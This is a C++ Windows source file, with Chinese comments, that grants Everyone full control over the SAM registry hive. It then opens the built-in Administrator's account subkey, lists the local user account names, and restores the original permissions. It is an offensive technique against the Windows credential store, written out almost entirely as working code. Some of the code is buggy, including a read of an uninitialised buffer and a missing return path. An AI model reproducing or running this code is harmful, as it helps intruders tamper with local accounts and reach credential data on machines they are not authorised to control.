#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <tchar.h>
#include <Aclapi.h> 
using namespace std;
#pragma comment (lib,"Advapi32.lib") 
using namespace std;
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
#define KEY_SET "SAM\\SAM\\Domains\\Account\\Users\\Names"

typedef struct ACCOUNT{
	TCHAR *a[MAX_KEY_LENGTH];
	unsigned long count;
	DWORD Type;
}acc;

ACCOUNT AccountList() 
{ 
	

	HKEY hKey;
	ACCOUNT acc;

	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,KEY_SET,0,KEY_READ,&hKey) == ERROR_SUCCESS)
	{

    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD i, retCode; 
 
    TCHAR  achValue[MAX_VALUE_NAME]; 
    DWORD cchValue = MAX_VALUE_NAME; 
	TCHAR shareValue[MAX_VALUE_NAME];
	DWORD shareType;
	DWORD shareSize;
	shareType=REG_BINARY;	
	shareSize=strlen(shareValue);	

 
    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    
	  if (cSubKeys)
    {
	
		acc.count = cSubKeys;
		  //sprintf(acc.count, "%s", cSubKeys);

        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                     achKey, 
                     &cbName, 
                     NULL, 
                     NULL, 
                     NULL, 
                     &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                
				//angellover

				char *b = new char[255];	
		

				sprintf(b,"%s", achKey);
				acc.a[i]=b;	

            }

		}

	
		return acc;
    }	

	}
	else
	{
	// printf("打开注册表失败");
	exit(-1);
	}

	RegCloseKey(hKey);
}
ACCOUNT Change_SAM_Access()
{ 

	ACCOUNT acc;
	DWORD dwRet; 
    LPSTR SamName = "MACHINE\\SAM\\SAM"; 
    PSECURITY_DESCRIPTOR pSD = NULL; 
    PACL pOldDacl = NULL; 
    PACL pNewDacl = NULL; 
    EXPLICIT_ACCESS ea; 
    HKEY hKey = NULL; 

    // 获取SAM主键的DACL 
    dwRet = GetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                NULL, NULL, &pOldDacl, NULL, &pSD); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("GetNamedSecurityInfo Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // 创建一个ACE，允许Everyone完全控制对象，并允许子对象继承此权限 
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
    BuildExplicitAccessWithName(&ea, "Everyone", KEY_ALL_ACCESS, SET_ACCESS, 
        SUB_CONTAINERS_AND_OBJECTS_INHERIT); 

    // 将新的ACE加入DACL 
    dwRet = SetEntriesInAcl(1, &ea, pOldDacl, &pNewDacl); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("SetEntriesInAcl Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // 更新SAM主键的DACL 
    dwRet = SetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                NULL, NULL, pNewDacl, NULL); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("SetNamedSecurityInfo Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // 打开SAM的子键 
    dwRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\000001F4", 
                0, KEY_ALL_ACCESS, &hKey); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("RegOpenKeyEx Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 
	acc=AccountList();
	   

FreeAndExit: 
    if (hKey) RegCloseKey(hKey); 
    if (pNewDacl) LocalFree(pNewDacl); 
    // 还原SAM主键的DACL 
    if (pOldDacl) SetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                        NULL, NULL, pOldDacl, NULL); 
    if (pSD) LocalFree(pSD); 
	return acc;
}


